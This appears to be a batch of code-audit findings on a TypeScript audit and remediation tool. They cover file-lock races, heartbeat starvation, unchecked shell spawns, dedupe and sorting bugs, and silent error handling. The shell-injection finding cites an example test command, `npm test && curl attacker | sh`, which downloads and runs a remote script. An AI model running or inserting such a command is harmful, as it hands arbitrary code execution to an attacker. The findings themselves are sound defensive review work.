findings.title: Closing-gate spawnSync starves the phase-lock heartbeat, recreating the double-hold the recovery path explicitly engineered away
findings.summary: INV-SCC-08 (src/shared/io/fileLock.ts:179-226) guarantees a LIVE lock holder is never classified stale: startLockHeartbeat re-stamps the lock mtime every STALE_LOCK_MS/3 via a setInterval callback. That guarantee holds only while the event loop runs. The remediation closing gate runs `runCombinedTestSuite` (src/remediate/phases/close.ts:933-963) and `runE2eTests` (src/remediate/phases/close.ts:1062-1091) as SYNCHRONOUS `spawnSync(..., { shell: true })` with NO `timeout` option, and closing executes inside the whole-advance mutex (`decideNextStepLoop` wraps `advanceUnderPhaseLock`, which reaches `handleClosing`, in `withFileLock(<artifactsDir>/phase.lock)` — src/remediate/steps/nextStep.ts:4286-4290, 4303-4306). Counterexample: a combined suite that runs longer than STALE_LOCK_MS (30s) blocks the event loop for its entire duration, so zero heartbeats fire; after 30s the lock file's mtime is stale, a concurrent `next-step` acquirer wins the lease-style steal (stealStaleLock, fileLock.ts:121-159 — the token check passes because the content is unchanged) and mutates state.json while the closing gate is still mid-run: two live writers on one guarded file. The repo already knows this exact mechanism and solved it on ONE path: the recovery verb precomputes required-test verdicts OUTSIDE the lock precisely because 'running one inside the state lock would starve the lock's own heartbeat timer and let a second acquirer reclaim the lock as stale mid-hold' (src/remediate/steps/dispatch/hostHandoff.ts:1232-1252, and runRequiredTest there carries a timeout). The normal closing path applies neither mitigation. Recommended change: make the closing suites async (spawn + await) like the rest of the advance, or move their execution outside the phase lock behind the same precomputed-verdict pattern; either removes the starvation mechanically instead of bounding suite length by hope.

findings.title: Declared-command-shape gate covers triage and required-test spawns but not the closing gate's test/e2e spawns
findings.summary: The shared rule (src/shared/tooling/commandShape.ts:7-14) states the contract: these strings reach `shell: true` in the repository root, so anything that chains, redirects, substitutes or subshells turns one declared command into arbitrary execution, and every spawner must ask `commandLeavesDeclaredShape` before spawning. Three of the four spawn sites comply: the host-handoff boundary refuses a bad shape at build time (src/remediate/steps/dispatch/hostHandoff.ts:421-439) before its verbatim spawn (:1373), and the triage re-verify path asks the predicate immediately before its shell spawn (src/remediate/phases/triage.ts:138-147). The closing gate does not: `runCombinedTestSuite` spawns `state.plan.test_command` (src/remediate/phases/close.ts:947-952) and `runE2eTests` spawns `state.plan.e2e_command` (close.ts:1072-1077) through `shell: true` with no shape check anywhere on the path — `test_command` is an unconstrained optional string off the extracted plan (src/remediate/state/types.ts:97; src/remediate/steps/nextStep.ts:629-630). Concrete counterexample: a plan whose test_command is `npm test && curl attacker | sh` is refused as out-of-contract if the item ever blocks (triage) and never admitted across the handoff, yet the SAME string executes verbatim in the repo root when the run reaches closing, and its exit code folds into `fullyGreen`/completion gating. This is the project's own 'enforce in tooling, never host discretion' invariant half-covered: the predicate exists and is one import away, and the uncovered half is not stated at the site (contrast triage.ts:130-139, which states its exposure). Fix: apply the same shared predicate (refuse or classify) at both close.ts spawn sites.

findings.title: sameLensDedupe lets an already-absorbed finding keep absorbing, permanently dropping a third finding's data
findings.summary: In sameLensDedupe the inner j-loop checks removed.has(group[j]) but never re-checks removed.has(group[i]) after the i-slot finding is absorbed (keepA=false marks group[i] removed), so the doomed i-slot finding keeps participating in subsequent (i, j+1...) pairs: when it wins such a pair it absorbs group[j+1]'s affected_files/evidence into itself and group[j+1] is added to removed, yet BOTH are then filtered out by the final findings.filter((f) => !removed.has(f)) - the third finding's data vanishes from the output entirely instead of travelling to a surviving finding. This directly violates the conservation invariant stated in CrossLensDedupePolicy.breakOnAbsorbedSurvivor ('once removed, a finding can neither absorb nor be re-emitted') and mechanically enforced in crossLensDedupe by its unconditional 'if (removed.has(group[i])) break;' guard, which sameLensDedupe lacks.

Contrast src/shared/findings/dedupe.ts:290-293 where crossLensDedupe stops unconditionally: 'if (removed.has(group[i])) break;' with the comment 'an absorbed finding never acts as a survivor'.

findings.title: Space-containing paths corrupt weightedGraph pair keys, yielding phantom coupling edges and phantom partition nodes
findings.summary: Deepening verdict on the prior F-1: STANDS, narrowed. weightedGraph joins each undirected pair into one space-delimited string key and later splits it at the first space, so corruption fires when the locale-smaller endpoint itself contains a space (a space in only the larger endpoint parses correctly absent collision); the fabricated endpoints bypass the scope guard (which ran earlier on the original endpoints), are admitted as nodes by the shared adjacency builder, enter every returned partition, and the real pair loses its coupling weight entirely.

findings.impact: On any repo with directory or file names containing spaces (routine on Windows/macOS-authored projects), each coupling edge whose lexicographically-first endpoint contains a space is rewritten to two nonexistent endpoints: the genuine pair loses its aggregated weight, so truly coupled files stop clustering together (missed real boundaries), while the phantom path fragments flow through resolutionSweep partitions into consensus and detectNonColocalization as boundary groups citing files that do not exist (spurious findings). Distinct pairs can additionally collide onto the same key (endpoints "a","b c" and "a b","c" both form "a b c"), silently merging unrelated coupling weight.

Lines 48-49 recover the endpoints with key.indexOf(" ") plus slice, splitting inside the lower endpoint when it contains a space: endpoints "new folder/x.ts" and "z.ts" produce key "new folder/x.ts z.ts" which parses as "new" + "folder/x.ts z.ts"; when instead only the HI endpoint holds the space ("z.ts" vs "new folder/x.ts" would not sort that way, but "b" vs "c d.ts" yields "b c d.ts" which parses correctly as "b" + "c d.ts"), the round-trip happens to survive - hence narrowed, not widened.
The scope guard at line 39 tests the ORIGINAL endpoints before aggregation, so the corrupted endpoints produced at line 49 are never re-checked against the universe.

src/shared/decompose/modularity.ts buildAdjacency unions edge endpoints into the node set (nodes = union of graph.nodes and both endpoints of every normalized edge), so phantom ids become first-class partition members rather than being dropped.

findings.title: Path-A promotion throws on source_finding_ids violations after every gate has passed, wedging subsequent next-steps
findings.summary: promoteImplementationDagToExtractedPlan throws (rather than returning refusals) when a Path-A implementation_dag node omits, repeats, mismatches, duplicates, or fails to cover source_finding_ids; the promotion gate calls it after integrity, traceability, obligation and write-scope gates have all passed, so the throw escapes as an unclassified stack that recurs on every subsequent next-step with no bounded re-emit.

evidence: implementationPlanPromotionGate awaits promoteImplementationDagToExtractedPlan(ctx.artifactsDir, ctx.root) at line ~2899 as the LAST step after the integrity, traceability, obligation-gate and scope-refusal checks, so no gate observes these conditions first.

Five distinct throw sites sit inside the strict Path-A branch (missing source_finding_ids, repeated member, no matching canonical work block, duplicated work block, incomplete coverage), all behind the runtime trigger approvedSource && nodes.some((node) => Array.isArray(node.source_folding_ids)) -- i.e. a partially-declaring DAG enters the strict path and any slip throws.

The module's own stated contract elsewhere is the opposite: normalizeBlockTargetedCommands documents 'Refusals are RETURNED, never thrown: the promotion boundary turns them into the same bounded re-emit every other promotion rejection takes', and the blocks.map throw is explicitly labeled 'a BACKSTOP for a caller that skipped that gate -- never the operator-facing path'; the source_finding_ids throws have no such gate in front of them, so the backstop IS the operator-facing path.

Only the gate-side enumeration check (validation/contractPipelineGates.ts) looks at source_finding_ids, and it validates obligation-level coverage of enumerated findings -- it never checks that DAG nodes declare canonical work-block memberships, so nothing upstream rejects the DAG that later throws.

findings.title: Replace the interior of the hand-rolled file lock with a vetted pure-JS lock library behind the identical exported surface
findings.summary: The repo's own two-tier dependency policy names lock as a correctness-sensitive mechanism to import rather than own, yet src/shared/io/fileLock.ts is ~390 lines of bespoke locking: a wx-create acquire loop, exponential backoff, mtime staleness with a lease-style .steal claim sidecar, a held-lock heartbeat setInterval, and Windows EPERM/EACCES contention heuristics - machinery whose own comments record two past double-hold bugs (the non-atomic read-token-then-unlink steal, then the INV-SCC-08 live-holder heartbeat). Cross-process mutual exclusion over remediation state.json and analyzer-policy.json is the hardest property in the system to test and the easiest for a platform quirk to invalidate, and it currently rests entirely on this in-house code. Replace the interior with a vetted, pure-JS, zero-native-dependency lock library such as proper-lockfile (atomic lock acquisition, mtime staleness with removal, retry/backoff, and an update() liveness refresh equivalent to the heartbeat), keeping the exported surface - acquireLock/releaseLock/withFileLock signatures and LockOptions - unchanged so LockedJsonStore, analyzerPolicy, and the remediate StateStore need no edits; wrap it so failures degrade explicitly per the same policy's malformed-input rule. Better because the correctness guarantee moves to maintained, widely exercised code, roughly 300 lines and their substantial test surface disappear, and the steal-claim/heartbeat edge cases become the library's problem instead of a standing invariant to defend; if the owner judges the bespoke machinery deliberate, the actionable residue is smaller - the policy bullet should then name withFileLock as an explicit owned exception instead of silently contradicting itself.

findings.title: stat-then-read TOCTOU in readStaleLockToken lets a stealer adopt a FRESH token and clobber a live lock
findings.summary: readStaleLockToken judges staleness from stat() but reads the token in a second call, so if the stale lock is legitimately stolen and re-created between the two, the returned 'stale token' is the new owner's fresh token; stealStaleLock's content-equality guard then passes against that fresh lock and unlinks it, producing a double-hold that defeats the very invariant the .steal claim documents.

affected_files.quoted_text: // and no acquirer ever unlinks a *fresh* lock, because (a) only the claim winner

findings.impact: Two processes concurrently hold the same lock: the displaced acquirer proceeds inside its critical section while the stealer mutates the same guarded artifact, silently losing updates or corrupting state.json-style files. Likelihood is low (requires a stale lock plus a competing stealer interleaving inside the stat->readFile->claim window), but the .steal claim machinery was introduced specifically to make concurrent steal safe, and this hole sits inside that guarantee.
evidence: src/shared/io/fileLock.ts:73-81 - readStaleLockToken stats lockPath, decides staleness from info.mtimeMs, then separately awaits readFile(lockPath) for the token; nothing re-verifies after the read that the inode/mtime observed is the one the token came from.

src/shared/io/fileLock.ts:150-153 - stealStaleLock's only protection before unlink is content equality with the token it was handed, so a token captured post-replacement validates against the replacement.

src/shared/io/fileLock.ts:106-114 - the comment asserts '(b) it unlinks only while the content still equals the exact stale token it set out to remove', but the token it set out to remove can already be the successor's fresh token, so the stated invariant does not hold.

Interleave: lock L is genuinely stale (holder crashed). Acquirer A stats L (stale). Stealer B claims .steal, reads old token, unlinks L, wx-creates L with tokenB, releases claim. A's readFile now returns tokenB; A treats tokenB as the stale token, wins the freed claim, sees content === tokenB, and unlinks B's live lock, then acquires L itself.

findings.title: Tier-S parser analyzers are dead on every packaged install: web-tree-sitter and tree-sitter-wasms sit in devDependencies, so npm consumers always get the silent regex floor
findings.summary: src/audit/extractors/analyzers/treeSitter.ts builds a full graceful-degradation loader for web-tree-sitter plus prebuilt grammars from tree-sitter-wasms, and python.ts/html.ts/css.ts gate their parser-grade extraction on it - yet package.json lists both packages ONLY under devDependencies (verified: dependencies are commander, smol-toml, yaml, zod, zod-to-json-schema). A devDependency never installs for a consumer of the published package, so every real audit run launched from an npm install silently takes the regex floor for Python/HTML/CSS: the degradation counter path that was built to be exceptional is in fact the guaranteed steady state, and audits of those repos ship materially weaker graphs with no signal that quality was lost. The codebase already anticipates external provision (getTreeSitterParser accepts a dependencyPath and graphEnrichmentExecutor passes one), but that requires a host that knows to wire it - exactly the rely-on-the-host-to-noticing class the project bans. The better deployment shape is mechanical: move both to optionalDependencies (npm installs them by default, tolerates failure) so the Tier-S path engages out of the box while the existing degrade-to-regex-floor behavior remains untouched for environments where the optional install fails; alternatively surface the degradation count in the run summary so the capability cliff is reported rather than silent. Either change makes the already-built parser machinery actually reachable in production instead of only in the repo checkout. The same defect class hits the TypeScript analyzer: src/audit/extractors/analyzers/typescript.ts falls back to `import("typescript")` ("the bundled typescript"), but typescript is ALSO only a devDependency, so on a consumer install even the TS graph path works solely when the audited repo happens to ship its own typescript at a resolvable dependencyPath.

findings.title: Acyclicity of the canonical dependency table is enforced nowhere, and the topological sort silently tolerates a cycle
findings.summary: Every revision and staleness verdict in the audit pipeline assumes ARTIFACT_DEPENDS_ON_MAP is a DAG, but nothing asserts it: computeDependencyFirstOrder treats revisiting an in-progress node as a plain stop rather than an error, so a future edge that closes a cycle yields an order in which an artifact is stamped before its dependency, records dependency revision 0, and oscillates across advances - the exact phantom-staleness churn computeArtifactStateSignature was built to detect.
evidence: Lines 30-45: the DFS has permanent and temporary sets, but the temporary hit returns silently instead of throwing; every node still lands in `ordered` exactly once, so the malformed input is indistinguishable from a valid one.

Line 160-162: dependencyRevisions reads artifacts[dependencyName]?.revision ?? usablePrevious?.artifacts[dependencyName]?.revision ?? 0, so a dependency not yet visited in the mis-ordered pass records revision 0 (or the pre-advance revision), and the next advance computes a different order and a different value - revision/deps churn with identical content.

No contract test pins acyclicity: a repo-wide search of tests/ for cycle assertions against dependencyMap/artifactMetadata finds none, unlike sibling invariants (e.g. audit-extractors-invariants.test.ts INV-01/INV-03 pin cycle behavior elsewhere); the map is hand-authored today, so exposure arrives with the next routine edge addition.

The module's own comments describe the DAG as THE single source of truth (ARC-cebe3421); an unenforced structural invariant in the source of truth is precisely the latent-failure class this repo's auditor-agnostic robustness rule bans.

findings.title: Angular route regex cannot span nested braces, so child routes lose their parent prefix

findings.title: Array order pinned by localeCompare contradicts the stated byte-identical re-extraction guarantee
findings.summary: buildRepoManifest sorts files with localeCompare() and its comment promises re-extraction is byte-identical when nothing changed, but localeCompare with no locale argument resolves the runtime default locale, so two hosts with different ICU locales collate non-ASCII paths differently and the same tree hashes to a different repo_manifest content_hash - cascading phantom staleness down the dependency DAG, the exact failure the sort was added to prevent.
findings.impact: Only bites repositories containing non-ASCII file names (accented latin, Cyrillic, CJK), where collation order is locale-defined; on such a repo the artifact set is stable per-host but not per-repo-content, so moving the audit between machines (or CI agents with different locales) invalidates otherwise-valid downstream work.
evidence: The guarantee is stated in the same function: "so sorting is semantically neutral and makes re-extraction byte-identical when nothing changed" (src/audit/extractors/fileInventory.ts:51-52).

The same locale-dependent comparator is used for emitted-order decisions throughout the assigned extractors: docsDigest.ts:104 (`a.localeCompare(b)` doc selection order), commentDecomposition.ts:300-302 and 351 (file processing order and edge sort), dataStateCoupling.ts:83 and 98 (pair member order, which also fixes the canonical a<b orientation), gitHistory.ts is unaffected only because its order comes from the shared miner.

Per CLAUDE.md, stable content-derived order exists precisely because incidental order churns content hashes and forces redundant downstream LLM re-runs; a locale-varying comparator reintroduces that channel.
runtime:unit:src-audit: confirmed — Deterministic runtime command succeeded: npm test

findings.title: Array-form test/e2e command spawned with shell:true loses argv quoting
findings.summary: runCombinedTestSuite and runE2eTests pass plan.test_command / plan.e2e_command straight into spawnSync with shell:true while the plan models them as argv arrays; under a shell the elements are joined with spaces and re-parsed, so any argument containing spaces, quotes, $, %, or other metacharacters is split or expanded differently than planned, producing spurious suite failures or executing unintended tokens.
findings.impact: A plan command that is valid as argv becomes unreliable through the shell round-trip: arguments with spaces or metacharacters break, environment-variable expansion happens unintentionally, and the resulting red transitions the run back to triage (re-blocking resolved items) for reasons that have nothing to do with the remediation — wasted retry cycles and corrupted failure_reason evidence.
evidence: Lines 941-952: suiteName explicitly handles both shapes ('Array.isArray(state.plan.test_command) ? ...join(" ") : state.plan.test_command') yet the spawn passes the raw value with 'shell: true', so an array like ["npm","test","--","--runInBand"] is rebuilt by cmd.exe/sh from a space-joined string with no per-element quoting.
Same pattern at lines 1072-1077 for e2e_command ('spawnSync(state.plan.e2e_command, { ... shell: true ...)').

By contrast the closing actions at lines 883-891 route git/npm through runTracked without a shell, preserving argv exactly — the two execution styles disagree on how a stored command reaches a process.

findings.title: Backlog size-ratchet silently resets on any baseline read/write failure, laundering grown ceilings
findings.summary: loadBaseline swallows every error reading .size-baseline.json as 'no baseline', and --update-baseline persists the replacement with a plain writeFileSync (non-atomic), so a truncated or unreadable baseline silently discards the recorded shrink-only file ceilings AND the over-budget-entry amnesty; the follow-up --update-baseline then records whatever a file currently measures as a first-time ceiling (planBaselineUpdate treats recorded===undefined as record-as-is), which is exactly the grown-ceiling refusal this gate exists to enforce.
findings.impact: A crash or permission fault during a baseline write converts the ratchet into a no-op: previously grandfathered entries start flagging as NEW violations, and the natural recovery command (--update-baseline without --raise-ceiling) locks in post-reset sizes, including sizes larger than the refused ceilings.
evidence: loadBaseline (line 121-127) uses a bare catch that maps any failure - EACCES, EISDIR, JSON.parse truncation - onto normalizeBaseline(null); sibling gates (check-control-bytes.mjs line 38, check-memory-citations.mjs line 74) deliberately narrow their tolerance to ENOENT and rethrow everything else.

The baseline is written at line 278 with writeFileSync(baselinePath, JSON.stringify(plan.baseline, null, 2) + newline, 'utf8'), with no temp-file-and-rename; the remediation state store in this same repo standardizes on atomic LockedJsonStore writes for exactly this reason.

planBaselineUpdate (line 234): 'recorded === undefined || measured <= recorded' records the measured size outright when no ceiling exists, so a reset baseline turns a would-be REFUSED raise into an unconditional first record.
runtime:unit:scripts: confirmed — Deterministic runtime command succeeded: npm test
reproduction: Truncate docs/backlog/.size-baseline.json (or make it unparseable), run node scripts/check-backlog-budget.mjs: the gate reports open-bugs.md-style files as fresh violations with no memory of prior ceilings.
Run node scripts/check-backlog-budget.mjs --update-baseline: the current (possibly grown) byte counts are recorded as first-time ceilings with no --raise-ceiling acknowledgement and no refusal.
Restore the pre-corruption baseline and diff: the shrink-only promises recorded before the fault are gone.

findings.title: Bare catch in loadExpectedSet silently disables the outstanding-lane shortfall report on any read failure

Additionally, because mergeExpectedSets starts from nothing, every declared lane counts as newly added and appendSubmissionEvent emits a second 'expected' event per lane, polluting the arrival record the module explicitly deduplicates elsewhere.

findings.title: Bounded suite-edge caps silently drop evidence with no diagnostic
findings.summary: When a directory's JSON-schema / GitHub-workflow / package-script / TypeScript-type-contract / python-test-util group exceeds the per-group file cap (MAX_BOUNDED_SUITE_EDGE_FILES or MAX_BOUNDED_TYPE_SUITE_EDGE_FILES), or a schema-contract test resolves more than the cap of .schema.json targets, all of that group's suite edges are skipped with no stderr note or artifact marker, so an operator cannot distinguish cap-tripped suppression from a genuine absence of related-file evidence.

The same file already establishes the reporting convention for degraded extraction - extractJsonSchemaReferenceEdges writes an '[audit-code] graphSuites: JSON parse error ...' note to stderr - so the mechanism for surfacing a skip exists and is simply not used on the cap paths.

findings.title: Build-lock concurrency machinery has zero test coverage
findings.summary: acquireBuildLock, waitForPeerBuild, the stale-lock mtime takeover, and the post-wait skip recheck in audit-code-wrapper-build.mjs are entirely untested despite being the only concurrency-sensitive logic in the wrapper.
findings.impact: A regression in lock takeover or the skip-recheck produces either concurrent tsc runs corrupting dist/ or a permanent skip (stale dist served), and nothing in CI would notice.
evidence: No test in tests/ references acquireBuildLock, waitForPeerBuild, releaseBuildLock, or the '.audit-code-build.lock' path; tests/audit/audit-code-wrapper-cli-surface.test.ts covers only shouldBuildDistForPaths and assertWorkspaceInstalled from this module.

The takeover path unlinks a lock file it does not own based purely on BUILD_LOCK_MAX_AGE_MS mtime age, with no owner-liveness token, then retries open('wx') - classic lost-update territory that only a test can pin.
After waitForPeerBuild returns, the code re-runs shouldBuildDist() and may silently return null (skip building); that peer-already-built branch is unreachable from any existing test.

findings.title: Build-lock contention paths emit no diagnostics while acquire/release do
findings.summary: audit-code-wrapper-build.mjs emits build_lock_acquired and build_lock_released stderr events, but the three contention outcomes an operator most needs to observe are silent: waitForPeerBuild polls without emitting a waiting event, its timeout error names the lock path but not the holder pid or age even though acquireBuildLock writes exactly that pid and acquired_at into the lock file, and the stale-lock break in acquireBuildLock unlinks the lock with no event.

affected_files.quoted_text: throw new Error(`Timed out waiting for build lock ${buildLockPath}.`);

findings.impact: A wrapper that hangs up to BUILD_LOCK_WAIT_TIMEOUT_MS (2 minutes) or silently breaks a stale lock gives the operator no signal distinguishing a live peer build from a hung or crashed holder; the concurrent-invocation scenario the lock exists for is exactly the one the event stream does not cover.
evidence: waitForPeerBuild loops on fileExists(buildLockPath) with only a wall-clock timeout check; it never reads the lock payload acquireBuildLock wrote, so the timeout message cannot say who held the lock or since when.

The stale-lock branch (Date.now() - lockStats.mtimeMs > BUILD_LOCK_MAX_AGE_MS) awaits unlink(buildLockPath).catch(() => {}) and retries with no stderr event, so a force-broken lock is invisible in the event stream.
ensureBuilt's return-null path (a peer finished the build while this process waited) also returns silently, so a caller cannot tell whether this invocation built, waited, or skipped.
reproduction: Create .audit-code-build.lock at the repo root with a current mtime and leave it in place to simulate a peer holder.

Run node wrapper/audit-code-wrapper-lib.mjs next-step from a second shell; stderr shows no waiting event, and after BUILD_LOCK_WAIT_TIMEOUT_MS the only output is the timeout error, which names the path but no holder.

findings.summary: The construction-time validator filters every depends_on entry that does not name an existing obligation id out of the graph before cycle detection and keys its map by id, so a ledger with misspelled dependency references or duplicate obligation ids is accepted with ordering edges silently lost.

findings.title: checkFileIntegrityRecords skips unhashed records silently - isClean cannot be distinguished from nothingChecked
findings.summary: Records lacking an expected hash are skipped with a bare continue and the returned FileIntegrityBuckets carries no checked/skipped counts, so a caller (and the operator reading audit-findings.json) cannot tell 'every record verified unchanged' from 'hash recording never ran and nothing was verified'.
findings.impact: This loop is the common core of audit-code's checkFileIntegrity and remediate-code's checkAffectedFileIntegrity - i.e. the tamper/resume-integrity signal for both pipelines. If the upstream hash-persisting step regresses or a scope change stops recording hashes, every record hits the !expectedHash skip, all three buckets stay empty, isClean comes back true, and the run reports full integrity with zero verification having occurred. The defect is invisible in the artifact: there is no count of how many records were actually compared. Returning checked/skipped totals (two numbers) makes the vacuous-pass case diagnosable at the artifact boundary instead of requiring the caller to recompute it.
evidence: 'if (!expectedHash) continue;' - skip contributes to no bucket and no counter.
FileIntegrityBuckets = { changed, missing, ioErrors, isClean } only; isClean is derived solely from the three empty buckets.
Doc comment on getExpectedHash: 'Records without one are skipped entirely.' - the skip is contractual but unobservable in the result.

findings.title: chunkLineCount loops forever on chunkSize <= 0 and has no production caller
findings.summary: chunkLineCount guards totalLines but not chunkSize: with chunkSize <= 0, end = min(start + chunkSize - 1, totalLines) is less than start, the range is pushed anyway, and start = end + 1 moves BACKWARD, so the while (start <= totalLines) loop never terminates and grows ranges until memory exhaustion instead of throwing. The function is also wired nowhere in src/ (only tests/audit/chunking.test.ts imports it), exactly the tested-but-unwired dead-code class this repo works by manual audit; deleting it removes the hazard, or fixing it adds a chunkSize guard plus a test.
evidence: src/audit/orchestrator/chunking.ts lines 14-21: no guard rejects chunkSize <= 0 before the loop; start = end + 1 strictly decreases when chunkSize <= 0.
grep for chunkLineCount across src/ and tests/ shows the only importer is tests/audit/chunking.test.ts; no production call site exists.
runtime:unit:src-audit: confirmed — Deterministic runtime command succeeded: npm test
chunking.ts advances with 'start = end + 1;' after the push; for chunkSize=0, end = Math.min(start - 1, totalLines) = start - 1, so start never moves and the while condition stays true
tests/audit/chunking.test.ts exercises totalLines 0, -1, 1, 200, 250, 25@10 and 3@1 - every case uses a positive chunkSize
reproduction: call chunkLineCount(10, 0): end = min(0 + 0 - 1, 10) = -1, push {start:0,end:-1}, start becomes 0, loop repeats forever.

findings.title: Confirmed with narrowing: published schemas drop the zod end>=start refinement on line_ranges; ingest-side zod validation bounds the impact - downgrade high to medium
findings.summary: Deepening verdict on the schemas:data_integrity F-1: the published worker schemas really do omit the zod end>=start refinement on verification.followup_tasks[].line_ranges, but the affected scope is narrower than originally claimed (no divergence on affected_files[].line_start/line_end) and the impact is bounded to a rejected submission because the zod source remains the validator of record at ingest - so the finding stands, narrowed, and is downgraded from high to medium.
findings.impact: A worker that pre-validates against the published contract gets a false green for an inverted line range and only learns at ingest; no invalid data is ever persisted because the tool re-validates against the zod source before accepting, so the real cost is rejected submissions and distrust of the published contract, not corrupted artifacts.
findings.likelihood: Certain divergence, low trigger rate: the affected block sits inside the optional verification.followup_tasks[] corner of the worker result, so payloads exercising it are rare.
evidence: schemas/audit_result.schema.json:414-440 and schemas/audit_results.schema.json:414-440 define verification.followup_tasks[].line_ranges[] items as {path, start>=1, end>=1} with required [path,start,end] and additionalProperties:false - no constraint ties end to start, so start=90 with end=2 validates green.

The zod source for these generated files (src/audit/contracts/workerSchemas.ts:43-57) adds .refine((range) => range.end >= range.start, ...) to that same object, and renderWorkerJsonSchema (workerSchemas.ts:102-120) emits via zodToJsonSchema, which has no JSON Schema encoding for refinements - the published projection is lossy by construction, so re-running scripts/audit/generate-schemas.mjs cannot close the gap.

Scope narrowing of the original evidence: the claim that the same silent-weakening applies to affected_files[].line_start/line_end is wrong as a divergence - neither the zod source (workerSchemas.ts:16-19) nor either published schema constrains ordering there, so both sides are simply unconstrained; the divergence is confined to verification.followup_tasks[].line_ranges.

Impact bound: ingest re-validates every accepted result against the zod source, so an inverted range is always rejected before persistence - this is a contract-drift/usability defect, not a stored-data-integrity breach, which is what justifies high -> medium.

Fix direction: either encode the constraint in a JSON-Schema-expressible form (cross-field ordering has none, so more realistically add a contract test pinning the refinement as ingest-only) or document the published schemas as non-normative projections with the zod source as validator of record.

findings.impact: A single corrupt optimization artifact converts into a run-blocking fault whose recovery is manual filesystem surgery; the incremental-reuse cache is treated as authoritative input rather than a discardable hint, and a structurally-valid-but-wrong-shaped body (e.g. missing per-file content_key) flows into the structure executor unvalidated.
evidence: src/shared/io/json.ts readOptionalJsonFile returns undefined only when isFileMissingError(ENOENT); a JSON.parse failure is rethrown to the caller as JsonParseError.
src/audit/io/artifacts.ts:378 calls const graphEdgeCache = await loadGraphEdgeCache(root); inside loadArtifactBundle with no catch around it.
Contrast: src/audit/orchestrator/staleness.ts documents that malformed task_affinity_graph.json degrades to empty rather than failing the run.

findings.title: Deepening verdict on F-3 (fabricated total_lines behind an always-true ternary): STANDS, narrowed to the sample fixture, downgraded high -> medium
findings.summary: VERIFIED AND STANDING, NARROWED AND DOWNGRADED. The ternary at L57-59 is a tautology: SAMPLE_REPO_FILES is a module constant that always contains src/api/auth.ts (L21), so .find is always truthy and total_lines is unconditionally the invented literal 100 for a file that exists nowhere on disk; the AuditResult contract ties file_coverage[].total_lines to actual line counts, so runSample emits a contract-violating result by construction, and its dead false branch (0) is unreachable so the expression disguises fabrication as computation. Narrowing holds because runSample is the in-tree demo/smoke fixture rather than the production pipeline, and the ingest validator skips the total_lines-vs-disk comparison whenever the path has no entry in the repo line index (src/audit/validation/auditResults.ts:784 guards on typeof expectedLineCount === "number"), which is always the case here since src/api/auth.ts is in no real repo manifest - so nothing rejects, crashes, or corrupts validated state; the blast radius is confined to (a) polluting a real artifacts dir when run with default argv, which is the separate already-tracked default-dir problem, and (b) tests and manual runs asserting against fabricated coverage, tracked under the tests-lens twin. Downgrade high -> medium follows from that containment: real but bounded to a demo path, silently accepted rather than propagated through validation.
findings.impact: The persisted audit_results.jsonl carries a coverage entry that violates the contract it demonstrates, and no validator can ever flag it because the declared file never exists on disk - so the sample both commits the violation and is structurally immune to the check that catches it elsewhere.

findings.title: Derivable module-contract field set is enumerated by hand in two files that must move in lockstep
findings.summary: The set of load-bearing finalized-module-contract fields is maintained as parallel hand-written lists in two files: semanticProjection.ts's DERIVABLE_MODULE_CONTRACT_FIELDS (which decides what participates in downstream staleness hashing) and derive.ts's DerivableModuleContract interface plus readFinalizedContracts (which decides what becomes obligations). Nothing ties them together, so a field added to the contract schema and missed in either copy fails silently in the worst direction: missed in the projection table means a changed/new field never re-stales any downstream artifact (phantom freshness), missed in the reader means the field is defaulted out of every derived obligation.
findings.impact: A future schema growth (e.g. adding a derivable 'acceptance_criteria' field to finalized_module_contracts) requires lockstep edits in src/remediate/contractPipeline/semanticProjection.ts and src/remediate/contractPipeline/derive.ts. findings.title: lockedJsonMutate writes with plain writeFile, violating the atomic temp-then-rename invariant every other writer honors
findings.summary: The package's persistence contract is atomic replace: the shared IO layer provides `writeFileAtomic` (temp file + rename-over-destination, src/shared/io/json.ts:88-117) and routes `writeJsonFile` through it (json.ts:176), precisely because 'writeFile in that position can be interrupted between truncate and the last flush' leaving a torn destination. `lockedJsonMutate` — the read-mutate-write helper added to close the TOCTOU window (src/shared/io/fileLock.ts:363-390) — ends its critical section with a bare `await writeFile(jsonPath, JSON.stringify(next, null, 2), "utf8")` (fileLock.ts:383). The lock serializes concurrent writers but does nothing about a crash, OOM kill, or power loss mid-write: the result is a truncated state/JSON artifact that the NEXT reader parses eagerly (`readJsonIfExists` → `JSON.parse`, fileLock.ts:352-361) and throws on, turning a recoverable crash into a wedged artifact. Counterexample: process dies halfway through writing a large analyzer-policy or ledger JSON via lockedJsonMutate; every subsequent acquire succeeds but every subsequent read throws SyntaxError, with no `.tmp` residue to recover from because no temp was ever used. The fix is mechanical and local: route the inner write through the existing `writeFileAtomic` (or writeJsonFile) so the module that owns mutual exclusion also inherits the durability floor the rest of the IO layer already guarantees.

findings.title: Non-git remediation lane accepts landed results with zero mechanical corroboration - the required-test rerun is skipped although it needs no git
findings.summary: When there is no persisted host_handoff binding and the target is not a git repo, requireRepositoryCorroboration is false, so a landed result skips corroborateHostResult entirely - including the rerunRequiredTests gate that lives inside it - leaving changed_files and test_evidence.status passed accepted on the host's word alone.
findings.impact: On the non-git lane the only surviving write-scope bound is parseResult's changed_files-subset-of-allowed_files string check, i.e. the host grading its own homework; the required tests are never executed and a self-attested passed array suffices, and the acceptance records as clean with no issue emitted, so the gap is silent. The rerun needs only cwd=root (runRequiredTest spawns with shell:true at root, no git involved), so the dropped check is mechanically available on exactly the lane that has no other check - the opposite of the enforce-in-tooling invariant. Narrowing note vs the original F-2: the default git-backed lane (host_handoff present, or isGitRepo true) runs the full corroboration chain - ancestry, orphan-gated recovery waiver, diff-tree derived changed-file equality, allowed_files containment, run-start-dirty overlap, mechanical test rerun - so any high-severity write-scope claim should be narrowed to the non-git lane, where the missing test rerun is the fixable half.
evidence: requireRepositoryCorroboration = state.host_handoff !== undefined || isGitRepo(paths.root) is false exactly when the repository is not git-backed and no binding was persisted; ingestRemediationHostResults only refuses when isGitRepo(root) && !state.host_handoff (trusted_binding_missing), so the non-git no-binding combination proceeds deliberately.

On that combination the landed-result branch takes acceptedFiles = result.changed_files verbatim and never calls corroborateHostResult; rerunRequiredTests is reached only inside corroborateHostResult (or for resolved_no_change decisions), so a landed result on this lane has its required_tests honored solely through the parse-time check that test_evidence echoes them with status passed - a string the host authored.
Nothing downstream compensates: no issue code is pushed, accepted_count increments, items flip to resolved, and the self-reported files enter applied_edit_surface.

